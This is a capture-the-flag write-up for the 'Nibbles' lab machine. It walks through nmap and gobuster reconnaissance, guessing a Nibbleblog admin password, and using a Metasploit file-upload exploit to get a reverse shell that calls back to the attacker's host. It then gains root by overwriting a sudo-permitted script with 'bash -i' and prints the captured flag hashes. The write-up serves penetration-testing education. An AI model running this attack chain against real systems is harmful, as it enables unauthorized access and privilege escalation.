# CTF Writeup: Nibbles

---

Added target_ip to /etc/hosts

```
sudo echo "10.129.121.11 nibbles.htb" | sudo tee -a /etc/hosts
```

# Nmap Scan

```
nmap -A nibbles.htb       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 06:08 CDT
Nmap scan report for nibbles.htb (10.129.121.11)
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   16.13 ms 10.10.14.1
2   16.49 ms nibbles.htb (10.129.121.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

## Reconnaissance

Since only ssh & http are open, I decided to inspect the webpage.

The Initial Webpage only prompts us with an "Hello world!", but in the source code
there is a comment, which provides us a hidden directory. 

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Didn't retrieve any information from the webpage itself & from it's source code.

Decided to utilize gobuster, to find potential hidden directories.

```
gobuster dir -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Output

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nibbles.htb/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://nibbles.htb/nibbleblog/themes/]
/admin                (Status: 301) [Size: 321] [--> http://nibbles.htb/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://nibbles.htb/nibbleblog/languages/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

/README provides us with the version of Nibbleblog.

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

and information about the Author.

```
===== About the author =====
Name: Diego Najar
E-mail: dignajar@gmail.com
Linkedin: http://www.linkedin.com/in/dignajar
```
Retrieved username admin from

```
http://nibbles.htb/nibbleblog/content/private/users.xml
```

## Vulnerability Assessment & Initial Access

Searched up for Nibbleblog CVE's

```
searchsploit nibbleblog                                       
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                       | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)        | php/remote/38489.rb
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

made msfconsole -q and configured exploit(multi/http/nibbleblog_file_upload).

set RHOSTS nibbles.htb
set LHOST 10.10.14.155
set TARGETURI /nibbleblog
set USERNAME admin


The password was quiet tricky, but after further guessing I was able to enumerate it --> nibbles

set PASSWORD nibbles
exploit

gained meterpreter as "nibbler"

```
meterpreter > shell
Process 1867 created.
Channel 0 created.
ls
db.xml
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

Retrived the user.txt flag in /home/nibbler/user.txt directory.

```
706e3addba7dccce5264b9055e9d9bba
```
## Privilege Escalation

Ran following command to check which files are executable with higher privleges and no authentification.

```
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Since there is a .zip file we unzipped it and it created the correct path & file like in shown in sudo -l.

Decided to remove the monitor.sh file and added my own.

```
echo "bash -i" > monitor.sh
chmod +x monitor.sh
```

Ran the following command to retrieve root shell.

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

Retrieved root.txt flag in /root/root.txt

```
0d766379b1c7eacfa879390a64e0ff78
```
